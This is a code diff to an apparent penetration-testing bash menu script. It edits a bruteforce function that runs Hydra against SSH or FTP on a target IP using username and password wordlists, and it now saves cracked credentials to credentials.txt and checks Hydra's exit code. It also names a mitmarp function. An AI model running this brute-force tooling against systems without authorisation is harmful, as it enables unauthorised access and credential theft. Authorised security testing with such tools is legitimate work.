@@ -185,7 +185,7 @@ bruteforce() {
 				break
 			else
 				echo
-				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
+				echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
 			fi
 		done
 	
@@ -200,7 +200,7 @@ bruteforce() {
 		# check if user and password files exist
 		if [[ ! -f $user_file || ! -f $pass_file ]]; then
 			echo
-			 echo -e "\e[31m[!]\e[0m  User file or password file does not exist."
+			echo -e "\e[31m[!]\e[0m  User file or password file does not exist."
 			echo
 			continue
 		fi
@@ -216,22 +216,35 @@ bruteforce() {
 		case $protocol in
 			SSH|ssh) protocol="ssh" ;;
 			FTP|ftp) protocol="ftp" ;;
-			*) echo;  echo -e "\e[31m[!]\e[0m Invalid protocol. Please choose SSH or FTP." ; continue ;;
+			*) echo; echo -e "\e[31m[!]\e[0m Invalid protocol. Please choose SSH or FTP." ; continue ;;
 		esac
 		
 		# launch attack
 		echo
-		 echo -e "\e[34m[+]\e[0m  Launching Hydra $protocol brute force attack on $target_ip..."
+		echo -e "\e[34m[+]\e[0m  Launching Hydra $protocol brute force attack on $target_ip..."
 		sleep 1
 		echo
 		echo "Press Ctrl-C to stop attack"
 		sleep 2
 		echo
-		hydra -v -L $user_file -P $pass_file $protocol://$target_ip:$port 
-	done
 
+		# Run Hydra and check its exit code
+		hydra -v -L $user_file -P $pass_file $protocol://$target_ip:$port -o credentials.txt
+		exit_code=$?
+
+		# Check exit code to see if Hydra failed
+		if [ $exit_code -ne 0 ]; then
+			echo
+			echo -e "\e[31m[!]\e[0m Hydra failed"
+			echo
+			read -p "Press enter to return to main menu"
+			sudo rm -f credentials.txt
+			break  # Return to the menu
+		fi
+	done
 	menu
 }
+
 
 
 mitmarp() {
